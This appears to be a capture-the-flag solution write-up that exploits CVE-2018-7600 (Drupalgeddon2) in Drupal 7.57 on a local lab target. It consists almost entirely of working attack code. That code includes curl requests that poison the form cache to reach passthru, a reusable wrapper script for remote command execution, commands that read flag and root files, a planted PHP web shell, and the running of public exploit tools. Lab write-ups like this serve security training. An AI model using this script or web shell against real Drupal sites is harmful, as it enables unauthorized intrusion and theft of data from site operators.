## Solution

### Phase 1: Reconnaissance

```bash
# Verify the target is running Drupal
curl -s http://localhost:4009/ | grep -i drupal

# Check CHANGELOG.txt to identify the exact version
curl -s http://localhost:4009/CHANGELOG.txt | head -5
# → Drupal 7.57, 2018-01-17
```

Drupal 7.57 is vulnerable to CVE-2018-7600. Public exploit code is widely available.

### Phase 2: Manual Two-Step Exploitation

The exploit requires a single curl session (shared cookie jar) across both requests.

#### Step-by-Step with curl

```bash
# Use a cookie jar so both requests share the same session
JAR=/tmp/drupal_jar.txt

# ── Step 1: Poison the form cache ──────────────────────────────────────────
# -g disables curl's glob expansion so [ and ] are passed literally
# #post_render must be encoded as %23post_render (# would start a URL fragment)
RESPONSE=$(curl -sg -c "$JAR" -b "$JAR" \
  -X POST \
  "http://localhost:4009/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=cat+/flag1.txt" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_id=user_pass&_triggering_element_name=name")

# Extract the form_build_id from the response
FBID=$(echo "$RESPONSE" | grep -o 'name="form_build_id" value="[^"]*"' | head -1 | cut -d'"' -f4)
echo "Poisoned cache ID: $FBID"

# ── Step 2: Trigger via file/ajax ──────────────────────────────────────────
curl -sg -c "$JAR" -b "$JAR" \
  -X POST \
  "http://localhost:4009/?q=file/ajax/name/%23value/${FBID}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_build_id=${FBID}" \
  | sed 's/\[{"command":"settings".*//'
```

> **`-g` flag**: Disables curl's glob expansion so `[` and `]` in the URL are passed literally to Drupal's router (without it curl errors with "bad range").
> **`%23`**: URL-encodes `#` (which would otherwise be treated as a URL fragment delimiter). The brackets `[` and `]` don't need encoding when using `-g`.

#### Wrapper Script

```bash
#!/bin/bash
# drupal_rce.sh — CVE-2018-7600 two-step exploit
# Usage: ./drupal_rce.sh "command"
set -e
TARGET="http://localhost:4009"
JAR=$(mktemp /tmp/drupal_XXXXXX.txt)
# URL-encode only the command value; brackets stay literal with -g
CMD=$(python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$1")

# Step 1: Poison form cache (-g lets [ ] pass literally; %23 encodes #)
RESP=$(curl -sg -c "$JAR" -b "$JAR" -X POST \
  "${TARGET}/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=${CMD}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_id=user_pass&_triggering_element_name=name")

FBID=$(echo "$RESP" | grep -o 'name="form_build_id" value="[^"]*"' | head -1 | cut -d'"' -f4)

if [ -z "$FBID" ]; then
  echo "[!] Could not extract form_build_id" >&2; rm -f "$JAR"; exit 1
fi

# Step 2: Trigger execution via file/ajax AJAX endpoint
curl -sg -c "$JAR" -b "$JAR" -X POST \
  "${TARGET}/?q=file/ajax/name/%23value/${FBID}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "form_build_id=${FBID}" \
  | sed 's/\[{"command":"settings".*//'

rm -f "$JAR"
```

```bash
chmod +x drupal_rce.sh

# Test execution
./drupal_rce.sh "whoami"          # → www-data

# Get FLAG 1
./drupal_rce.sh "cat /flag1.txt"  # → dr7_rce_unauth

# Get FLAG 2
./drupal_rce.sh "cat /flag2.txt"  # → full_c0mp_4ch13v3d

# Enumerate /root (cannot ls, but can traverse known paths)
./drupal_rce.sh "find /root -maxdepth 3 -name '*.txt' 2>/dev/null"
# → /root/secret/admin_notes.txt

# Get FLAG 3
./drupal_rce.sh "cat /root/secret/admin_notes.txt"  # → r00t_4dm1n_n0t3s
```

### Phase 3: Alternative — Web Shell for Interactive Access

```bash
# Upload a simple PHP web shell
./drupal_rce.sh 'echo "<?php system(\$_GET[\"c\"]); ?>" > /var/www/html/sites/default/files/s.php'

# Use the web shell (no session management needed after this)
curl "http://localhost:4009/sites/default/files/s.php?c=whoami"
curl "http://localhost:4009/sites/default/files/s.php?c=cat+/flag1.txt"
curl "http://localhost:4009/sites/default/files/s.php?c=cat+/root/secret/admin_notes.txt"
```

### Phase 4: Using Public Exploits

```bash
# dreadlocked's Drupalgeddon2 (Ruby)
git clone https://github.com/dreadlocked/Drupalgeddon2.git
cd Drupalgeddon2
ruby drupalgeddon2.rb http://localhost:4009

# pimps' CVE-2018-7600 (Python)
git clone https://github.com/pimps/CVE-2018-7600.git
cd CVE-2018-7600
python3 drupa7-CVE-2018-7600.py http://localhost:4009 -c "cat /flag1.txt"
```

> **Note**: Public exploits typically handle their own session management. If they fail, verify the site is installed and healthy first.